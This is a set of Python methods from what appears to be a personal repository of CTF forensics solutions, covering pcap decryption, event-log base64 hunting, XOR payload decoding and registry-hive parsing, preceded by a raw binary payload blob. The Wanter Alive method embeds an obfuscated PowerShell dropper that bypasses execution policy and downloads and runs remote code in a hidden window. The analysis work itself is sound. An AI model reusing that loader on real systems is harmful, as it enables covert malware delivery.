\x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5"Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82"\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc"\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&\xe7NQ\x9e\'93M\x8f`!\xcc\x80#%\x04\xd2\xeb"T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{>_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e<\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\'Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e"\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9>\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\'\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2"\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\'\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\'\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\';r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99<)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12<{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5>"\'\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8"\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&|>\x13(<\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6<\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18<\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3<\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04<\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac<N7)g\x9f\xc1\xd8p\xab\'\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%"p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c<\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-"\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&+\xf7\x83Oj\x9d\xab\xb7Uh"z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K>qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\'\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]"\xb2\xa8\x82\xac`\'L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00'

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def demarshalling(self):
        """
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        """
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def decrypting_packet(self):
        """
        Description:
            Challenge specific function
        """
        # packet_data_path = self.folfil("data", "packet_1.data")

        ending_number = 79

        for num in range(78, ending_number + 1):
            packet_data_path = self.folfil("data", f"packet_{num}.data")

            with open(packet_data_path, "rb") as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f"Packet {num} :")
            print(decrypted_data)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        """

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == "scapy":
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == "pyshark":
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = "packets.pickle",
        folder_save: str = "data",
    ):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to "packets.pickle".
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to "data".
        """

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file

            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            packets = self.pickle_load_data(file_path)
        return packets

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_stream_extract(self, packets, stream_num=None):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            packets (dict): Dictionary of packets
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        """

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            save=True,
            filename_save="packets_scapy.pickle",
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if packet.tcp.stream == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extrac_tcp_stream_numbers(self, pcap_file):
        """
        Description:
            Extracts the tcp stream numbers from the pcap

        Args:
            pcap_file (str): Path to the pcap file.

        Returns:
            dict: Dictionary of session indexes
        """
        # To save the stream indexes
        sess_index = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, "stream"):
                sess_index[i + 1] = pkt.tcp.stream
        return sess_index

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extract_tcp_streams(self, pcap_file, stream_num):
        # To save the stream indexes
        packet_dict = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, "stream") and int(pkt.tcp.stream) == stream_num:
                packet_dict[i + 1] = pkt
        return packet_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def testin_streams(self):
        # session_index = self.pyshark_extrac_tcp_stream_numbers(self.challenge_file)
        print("Extracting tcp stream")
        packets = self.pyshark_extract_tcp_streams(self.challenge_file, 4)
        print("Extracted Streams")
        # self.pickle_save_data(packets, "packets_stream_4.pickle")

        packet_keys = packets.keys()
        packet_keys = sorted(packet_keys)

        # print("Packet keys:", packet_keys)

        for i in range(packet_keys[0], packet_keys[0] + 7):
            print(f"Packet {i}:")
            print(packets[i].tcp.payload)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def get_scapy_tcp_stream(self, nunber: int):
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            raw=True,
            save=True,
            filename_save="packets_scapy_raw.pickle",
        )
        stream = packets.sessions()
        return stream

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_packet_997_attempt(self):
        stream_4 = self.custom_stream_extract(stream_num=4)
        decrypted_data = self.dec_file_mes(stream_4[997].load, self.encryption_key)
        # print(decrypted_data)
        md5_hash = hashlib.md5(decrypted_data).hexdigest()
        print("MD5 Hash of the byte string:", md5_hash)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def main(self):
        # self.demarshalling()
        # self.testin_streams()
        # self.save_encryption_key(self.key, self.folfil("data", "key.pem"))
        # packets = self.pickle_load_data("packets_dict.pickle")
        # packets_stream = self.pickle_load_data("packets_stream_4.pickle")
        # print(packets[76].load)
        # print(packets_stream[76])
        print(self.get_scapy_tcp_stream(4))

	# /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def deobfuscation(self):

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"

        latifoliado = (
            latifoliado
            + "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
        )
        latifoliado = (
            latifoliado
            + "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
        )
        latifoliado = latifoliado + "CcpKSkpd2FudGVkCgd2FudGVkCg"

        parrana = "d2FudGVkCg"

        arran = " d2FudGVkCg d2FudGVkCg "
        arran = arran + "$d2FudGVkCgCod2FudGVkCgd"
        arran = arran + "id2FudGVkCggod2FudGVkCg "
        arran = arran + "d2FudGVkCg" + latifoliado + "d2FudGVkCg"
        arran = arran + "$d2FudGVkCgOWd2FudGVkCgj"
        arran = arran + "ud2FudGVkCgxdd2FudGVkCg "
        arran = arran + "=d2FudGVkCg [d2FudGVkCgs"
        arran = arran + "yd2FudGVkCgstd2FudGVkCge"
        arran = arran + "md2FudGVkCg.Td2FudGVkCge"
        arran = arran + "xd2FudGVkCgt.d2FudGVkCge"
        arran = arran + "nd2FudGVkCgcod2FudGVkCgd"
        arran = arran + "id2FudGVkCgngd2FudGVkCg]"
        arran = arran + ":d2FudGVkCg:Ud2FudGVkCgT"
        arran = arran + "Fd2FudGVkCg8.d2FudGVkCgG"
        arran = arran + "ed2FudGVkCgtSd2FudGVkCgt"
        arran = arran + "rd2FudGVkCgind2FudGVkCgg"
        arran = arran + "(d2FudGVkCg[sd2FudGVkCgy"
        arran = arran + "sd2FudGVkCgted2FudGVkCgm"
        arran = arran + ".d2FudGVkCgCod2FudGVkCgn"
        arran = arran + "vd2FudGVkCgerd2FudGVkCgt"
        arran = arran + "]d2FudGVkCg::d2FudGVkCgF"
        arran = arran + "rd2FudGVkCgomd2FudGVkCgb"
        arran = arran + "ad2FudGVkCgsed2FudGVkCg6"
        arran = arran + "4d2FudGVkCgStd2FudGVkCgr"
        arran = arran + "id2FudGVkCgngd2FudGVkCg("
        arran = arran + "$d2FudGVkCgcod2FudGVkCgd"
        arran = arran + "id2FudGVkCggod2FudGVkCg)"
        arran = arran + ")d2FudGVkCg;pd2FudGVkCgo"
        arran = arran + "wd2FudGVkCgerd2FudGVkCgs"
        arran = arran + "hd2FudGVkCgeld2FudGVkCgl"
        arran = arran + ".d2FudGVkCgexd2FudGVkCge"
        arran = arran + " d2FudGVkCg-wd2FudGVkCgi"
        arran = arran + "nd2FudGVkCgdod2FudGVkCgw"
        arran = arran + "sd2FudGVkCgtyd2FudGVkCgl"
        arran = arran + "ed2FudGVkCg hd2FudGVkCgi"
        arran = arran + "dd2FudGVkCgded2FudGVkCgn"
        arran = arran + " d2FudGVkCg-ed2FudGVkCgx"
        arran = arran + "ed2FudGVkCgcud2FudGVkCgt"
        arran = arran + "id2FudGVkCgond2FudGVkCgp"
        arran = arran + "od2FudGVkCglid2FudGVkCgc"
        arran = arran + "yd2FudGVkCg bd2FudGVkCgy"
        arran = arran + "pd2FudGVkCgasd2FudGVkCgs"
        arran = arran + " d2FudGVkCg-Nd2FudGVkCgo"
        arran = arran + "Pd2FudGVkCgrod2FudGVkCgf"
        arran = arran + "id2FudGVkCgled2FudGVkCg "
        arran = arran + "-d2FudGVkCgcod2FudGVkCgm"
        arran = arran + "md2FudGVkCgand2FudGVkCgd"
        arran = arran + " d2FudGVkCg$Od2FudGVkCgW"
        arran = arran + "jd2FudGVkCguxd2FudGVkCgD"

        return arran

	# /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def main(self):

        text = self.deobfuscation()
        text = text.split(" ")

        for i in text:
            print(self.decode_base64(i.strip()))

	# /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def xor_function_dec(self, given_string, length):
        xor_key = 45
        result = bytearray()
        for i in range(length):
            result.append(given_string[i] ^ xor_key)
            xor_key = (xor_key ^ 99) ^ (i % 254)
        return bytes(result)

	# /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def regexp(self, file_content):
        pattern = b"sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        index = file_content.find(pattern)
        index = index + len(pattern)
        return index

	# /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def main(self):
        file_content = open(self.challenge_file, "rb").read()
        index = self.regexp(file_content)
        payload = file_content[index : index + 13082]
        payload = self.xor_function_dec(payload, len(payload))
        print(payload)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.folder_logs = self.Path(self.folder_files, "Logs")
        self.folder_xml = self.Path(self.folder_data, "xml")

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def evtx_open(self, file, func, *args, **kwargs):
        with evtx.Evtx(file) as log_file:
            func(log_file, file, *args, **kwargs)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def searching_records(self, log_file, func, *args, **kwargs):
        for record in log_file.records():
            func(record, *args, **kwargs)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def saving_xml(self, log_file, file, display=False):
        xml_file = self.Path(self.folder_xml, f"{file.name}.xml")
        if display:
            print("-" * 50)
            print(f"File: {file}")
            print("-" * 50)

        with open(xml_file, "w") as f:
            for record in log_file.records():
                record_xml = record.xml()
                if display:
                    print(record_xml)
                f.write(record_xml)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_evtx_analysis(self, file):
        with evtx.Evtx(file) as log_file:
            self.saving_xml(log_file, file, display=False)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_searching_file(self, file, *args, **kwargs):
        return self.search_for_base64(file, *args, **kwargs)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def sorting_results(self, results):
        results = list(set(results))
        results = sorted(results, key=lambda x: len(x), reverse=True)
        return results

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def main(self):

        # Converting evtx files to xml
        # self.exec_on_files(self.folder_logs, self.local_evtx_analysis)

        # Searching for base64 strings in xml files
        base64_strings = self.exec_on_folder(
            folder=self.folder_xml,
            func=self.local_searching_file,
            display=False,
            save=True,
            strict=True,
        )

        base64_strings = self.sorting_results(base64_strings)
        print(base64_strings[0])
        flag = self.decode_base64(base64_strings[0])
        print(flag)
        flag = self.re_match_partial_flag(flag, origin="HTB")

        second_part = base64_strings[5]
        flag = "".join(flag[0]) + self.decode_base64(second_part)

        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_strings(self, file_path, min_length=4):
        """
        Description:
            Extracts printable strings from a file

        Args:
            file_path (str): The path to the file
            min_length (int): The minimum length of the string to extract

        Returns:
            list: The list of strings

        """
        with open(file_path, "rb") as f:
            # Read the entire file as binary
            data = f.read()

            # Use a regular expression to find sequences of printable characters
            # The regex matches sequences of characters that are printable (ASCII 32-126)
            # and have a minimum length defined by min_length
            strings = re.findall(rb"[ -~]{%d,}" % min_length, data)

            # Decode the byte strings to regular strings
            return [s.decode("utf-8", errors="ignore") for s in strings]

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_exif(self, file_path):
        """
        Description:
            Extracts EXIF data from a file

        Args:
            file_path (str): The path to the file

        Returns:
            dict: The EXIF data
        """
        # with exiftool.ExifTool() as et:
        with exiftool.ExifToolHelper() as et:
            # Read the EXIF data from the file but not duplicate ones
            # metadata = et.get_metadata(
            #     file_path,
            # )

            metadata = et.get_metadata([file_path])

            # Return the EXIF data
            return metadata

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def ascii_rot(self, text, n):
        """
        Description:
            Rotates the ASCII characters in a string by n positions

        Args:
            text (str): The text to rotate
            n (int): The number of positions to rotate



        """
        roted_text = ""
        for i in text:
            ascii_str = ord(i) + n
            if ascii_str > 126:
                # This is to avoid the non-printable characters
                roted_text += chr((ascii_str % 127) + 32)
            elif ascii_str < 33:
                # This is to avoid the non-printable characters
                roted_text += chr(ascii_str + 33)
            else:
                roted_text += chr(ascii_str)

        return roted_text

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def brute_ascii_rot(self, text, identifier):
        """
        Description:
            Brute forces the rotation of ASCII characters in a string

        Args:
            text (str): The text to rotate
            identifier (str): The string to search for in the rotated text

        Returns:
            str: The rotated text
        """
        for j in range(200):
            flag = self.ascii_rot(text, j)
            if identifier in flag:
                print(j)
                return flag

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def main(self):
        # Extract strings from the file
        strings = self.extract_strings(self.challenge_file, min_length=10)

        # # Print the strings
        # for s in strings:
        #     print(s)

        # exifs = self.extract_exif(self.challenge_file)
        # Print the EXIF data

        comment = """2m{y!"%w2'z{&o2UfX~ws%!._s+{ (&@Vwu{ (&@_w%{v{(&0."""

        flag = self.brute_ascii_rot(comment, "CTFlearn")
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def main(self):
        # flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        # print(flag)
        self.solve(self.challenge_file)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def solve(self, hive_path):
        with open(hive_path, "rb") as f:
            data = f.read()

        cell, class_len = find_skew1_cell(data)

        # variant 1: exact header + class-name bytes = 4 + class_len
        flag1_blob = cell.data[: REG_CELL_HDR + class_len]

        # variant 2: entire cell (may include 0-4 bytes padding)
        flag2_blob = cell.data

        print(
            "\nFound Skew1 class-name cell @ 0x{:X}, length {} bytes".format(
                cell.off, cell.size
            )
        )
        print("Class-name  :", cell.data[4 : 4 + class_len].decode("utf-16le"))
        print("\nSubmit either of the following (depending on challenge checker):")
        print(" 1) no-padding : ECSC{{{}}}".format(flag1_blob.hex().upper()))
        print(" 2) with pad   : ECSC{{{}}}".format(flag2_blob.hex().upper()))

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -> str:
        with open(hive_path, "rb") as f:
            data = f.read()

        # 1) locate the ASCII string “Skew1”
        skew_idx = data.find(b"Skew1")
        if skew_idx == -1:
            raise ValueError("Could not find Skew1 key name in hive")

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b"nk", 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError("`nk` signature not found before Skew1")

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from("<I", data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from("<H", data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell – grab its whole body
        cell_size = struct.unpack_from("<i", data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f"ECSC{{{cell_blob.hex().upper()}}}"

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def main(self):
        flag = self.extract_skew1_bootkey_piece(self.challenge_file)
